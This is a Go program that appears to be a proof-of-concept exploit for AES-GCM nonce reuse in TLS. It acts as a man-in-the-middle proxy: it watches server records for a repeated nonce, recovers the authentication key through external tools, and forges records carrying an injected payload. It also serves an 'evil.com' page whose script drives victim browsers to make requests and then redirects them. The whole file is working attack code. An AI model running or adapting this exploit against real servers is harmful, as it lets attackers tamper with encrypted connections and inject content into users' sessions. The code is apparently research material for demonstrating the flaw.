package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os/exec"
	"strings"
)

var localAddr *string = flag.String("l", "localhost:8443", "local address")
var remoteAddr *string = flag.String("r", "localhost:443", "remote address")
var webAddr *string = flag.String("w", "localhost:8080", "web address")

type GCMAuthKey [16]byte

const (
	StateHandshake = iota
	StateObserve
	StateHijack
)

type TLSHijackerProxy struct {
	AuthKey    *GCMAuthKey
	SeqNo      uint64
	UsedNonces map[uint64]*TLSRecord
	State      int
}

func NewTLSHijackerProxy() *TLSHijackerProxy {
	return &TLSHijackerProxy{
		AuthKey:    nil,
		SeqNo:      0,
		UsedNonces: map[uint64]*TLSRecord{},
		State:      StateHandshake,
	}
}

var proxy = NewTLSHijackerProxy()

type TLSRecordHeader struct {
	ContentType     uint8
	ProtocolVersion struct {
		Major uint8
		Minor uint8
	}
	FragmentLength uint16
}

type TLSRecord struct {
	Header   TLSRecordHeader
	SeqNo    uint64
	Fragment []byte
}

type TLSAuthData struct {
	SeqNo  uint64
	Header TLSRecordHeader
}

func (rec *TLSRecord) Nonce() uint64 {
	return binary.BigEndian.Uint64(rec.Fragment[:8])
}

func (rec *TLSRecord) GCMData() (a, c, t []byte) {
	buf := new(bytes.Buffer)
	authData := TLSAuthData{rec.SeqNo, rec.Header}
	authData.Header.FragmentLength -= 24 // hax
	binary.Write(buf, binary.BigEndian, &authData)
	a = buf.Bytes()

	frag := rec.Fragment
	c = frag[8 : len(frag)-16]
	t = frag[len(frag)-16:]

	fmt.Println(len(a), len(c), len(t))

	return a, c, t
}

func hexifyArgs(binargs ...[]byte) (hexargs []string) {
	hexargs = make([]string, len(binargs))
	for i, binarg := range binargs {
		hexargs[i] = hex.EncodeToString(binarg)
	}
	return hexargs
}

func recoverKey(rec1, rec2 *TLSRecord) *GCMAuthKey {
	a1, c1, t1 := rec1.GCMData()
	a2, c2, t2 := rec2.GCMData()

	args := hexifyArgs(a1, c1, t1, a2, c2, t2)
	fmt.Println(args)

	cmd := exec.Command("../tool/recover", args[:]...)
	out, err := cmd.Output()
	if err != nil {
		panic(err)
	}

	out = bytes.TrimSpace(out)
	if string(out) == "" {
		fmt.Printf("found 0 key candidates!\n")
		return nil
	}

	hexkeys := strings.Split(strings.TrimSpace(string(out)), "\n")
	keys := make([]GCMAuthKey, len(hexkeys))
	for i, hexkey := range hexkeys {
		binkey, err := hex.DecodeString(hexkey)
		if err != nil {
			panic(err)
		}

		copy(keys[i][:], binkey)
	}

	fmt.Printf("found %d key candidates:\n", len(keys))
	for _, key := range keys {
		fmt.Printf("%s\n", hex.EncodeToString(key[:]))
	}

	return &keys[0]
}

func min(x, y int) int {
	if x < y {
		return x
	} else {
		return y
	}
}

func xor(dst, src []byte) {
	k := min(len(dst), len(src))
	for i := 0; i < k; i += 1 {
		dst[i] ^= src[i]
	}
}

func forgeRecord(rec1 *TLSRecord, key *GCMAuthKey) (rec2 *TLSRecord) {
	fragment := make([]byte, rec1.Header.FragmentLength)
	copy(fragment, rec1.Fragment)

	payload, err := hex.DecodeString("4b160f11061d111e1503451c1b46440d131d574c5d5b16115c0a1f191f")
	if err != nil {
		panic(err)
	}

	fmt.Println(rec1)

	xor(fragment[len(fragment)-62:], payload)
	rec2 = &TLSRecord{rec1.Header, rec1.SeqNo, fragment}

	a1, c1, t1 := rec1.GCMData()
	a2, c2, t2 := rec2.GCMData()

	args := hexifyArgs(a1, c1, t1, a2, c2, key[:])
	fmt.Println(args)

	cmd := exec.Command("../tool/forge", args[:]...)
	out, err := cmd.Output()
	if err != nil {
		panic(err)
	}

	fmt.Println(string(out))

	t2, err = hex.DecodeString(string(bytes.TrimSpace(out)))
	if err != nil {
		panic(err)
	}
	copy(fragment[len(fragment)-16:], t2)

	fmt.Println(hex.EncodeToString(fragment))

	return rec2
}

func dialRemote() *net.TCPConn {
	raddr, err := net.ResolveTCPAddr("tcp", *remoteAddr)
	if err != nil {
		panic(err)
	}

	rconn, err := net.DialTCP("tcp", nil, raddr)
	if err != nil {
		panic(err)
	}

	return rconn
}

func readRecord(r io.Reader, seqNo uint64) *TLSRecord {
	var header TLSRecordHeader
	err := binary.Read(r, binary.BigEndian, &header)
	if err == io.EOF {
		return nil
	} else if err != nil {
		panic(err)
	}

	fragment := make([]byte, header.FragmentLength)
	_, err = io.ReadFull(r, fragment)
	if err != nil {
		panic(err)
	}

	return &TLSRecord{header, seqNo, fragment}
}

func writeRecord(w io.Writer, rec *TLSRecord) {
	binary.Write(w, binary.BigEndian, &rec.Header)
	_, err := w.Write(rec.Fragment)
	if err != nil {
		panic(err)
	}
}

func (x *TLSHijackerProxy) handle(lconn *net.TCPConn) {
	defer lconn.Close()

	rconn := dialRemote()
	defer rconn.Close()

	go io.Copy(rconn, lconn)

	for {
		rec := readRecord(rconn, x.SeqNo)
		if rec == nil {
			break
		}
		log.Println(rec.Header)

		x.SeqNo += 1

		switch x.State {

		case StateHandshake:
			if rec.Header.ContentType == 20 {
				x.State = StateObserve
				x.SeqNo = 0
			}

		case StateObserve:
			nonce := rec.Nonce()
			if oldRec, ok := x.UsedNonces[nonce]; ok {
				x.AuthKey = recoverKey(rec, oldRec)
				x.State = StateHijack
			} else {
				x.UsedNonces[nonce] = rec
			}
			log.Println(nonce)

		case StateHijack:
			rec = forgeRecord(rec, x.AuthKey)

		}

		writeRecord(lconn, rec)
	}

	log.Printf("%d nonces\n", len(x.UsedNonces))
	log.Println("conn closed")
}

func serveHTTP(addr string) {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		var js string
		if proxy.State == StateHijack {
			js = "window.location = 'https://noncerepeater.com:8443/';"
		} else {
			js = "var img = new Image();" +
				"img.src = 'https://noncerepeater.com:8443/';"
		}

		io.WriteString(w,
			"<!DOCTYPE html>"+
				"<head>"+
				"<title>evil.com</title>"+
				"<meta http-equiv=refresh content=1>"+
				"</head>"+
				"<body>"+
				"now is the season of evil"+
				"<script>"+
				js+
				"</script>"+
				"</body>"+
				"</html>")
	})

	log.Fatal(http.ListenAndServe(addr, nil))
}

func passThrough(lconn *net.TCPConn) {
	defer lconn.Close()

	rconn := dialRemote()
	defer rconn.Close()

	go io.Copy(rconn, lconn)
	io.Copy(lconn, rconn)
}

func main() {
	flag.Parse()

	go serveHTTP(*webAddr)

	laddr, err := net.ResolveTCPAddr("tcp", *localAddr)
	if err != nil {
		panic(err)
	}

	listener, err := net.ListenTCP("tcp", laddr)
	if err != nil {
		panic(err)
	}

	lconn, err := listener.AcceptTCP()
	if err != nil {
		panic(err)
	}

	go proxy.handle(lconn)

	for {
		lconn, err = listener.AcceptTCP()
		if err != nil {
			panic(err)
		}

		go passThrough(lconn)
	}
}
